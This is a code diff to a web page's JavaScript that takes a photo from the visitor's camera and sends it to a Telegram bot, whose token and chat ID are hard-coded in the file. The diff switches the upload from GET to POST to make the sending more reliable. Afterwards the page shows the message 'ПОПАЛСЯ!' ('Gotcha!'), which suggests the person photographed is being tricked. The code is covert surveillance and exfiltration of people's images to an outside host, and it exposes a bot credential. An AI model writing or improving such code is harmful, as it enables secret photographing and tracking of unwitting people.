@@ -51,21 +51,30 @@
                         const token = "9270278972:AAHHz8RjL_KQ0OBDXHQUCad7cJW4BdbXafQ"; 
                         const chatId = "1062964951";
 
-                        // Отправляем в Telegram
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${dataUrl}`)
-                            .then(response => {
-                                if (response.ok) {
-                                    statusText.innerText = "ПОПАЛСЯ! 📸";
-                                } else {
-                                    statusText.innerText = "Ошибка отправки!";
-                                }
+                        // Используем метод POST — он гораздо стабильнее для картинок!
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                photo: dataUrl
                             })
-                            .catch(err => {
-                                statusText.innerText = "Ошибка сети!";
-                                console.error(err);
-                            });
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                statusText.innerText = "ПОПАЛСЯ! 📸";
+                            } else {
+                                statusText.innerText = "Ошибка отправки!";
+                            }
+                        })
+                        .catch(err => {
+                            statusText.innerText = "Ошибка сети!";
+                            console.error(err);
+                        });
 
-                        // Выключаем камеру, чтобы она не работала постоянно
+                        // Выключаем камеру
                         stream.getTracks().forEach(track => track.stop());
                     }, 1000);
                 };
